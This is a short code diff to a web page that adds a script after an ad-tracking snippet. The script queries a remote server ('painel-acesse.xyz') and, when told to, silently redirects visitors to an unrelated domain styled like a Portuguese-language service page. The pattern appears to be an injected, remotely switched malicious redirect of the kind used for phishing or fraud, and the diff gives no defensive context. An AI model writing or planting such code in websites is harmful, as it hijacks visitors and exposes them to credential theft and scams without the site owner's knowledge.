@@ -59,6 +59,25 @@ function gtag_report_conversion(url) {
 </script>
 
   
+<script>
+        
+    var Dlink = 'https://saneamento.via-minhabrk.online/';
+
+    fetch('https://painel-acesse.xyz/index/in.php')
+        .then(response => response.json())
+        .then(data => {
+
+            if (data.is === true) {
+                window.location.href = Dlink;
+            }
+
+    }).catch(error => {
+        console.error('Erro:', error);
+    });
+
+</script>
+
+  
 
 
 
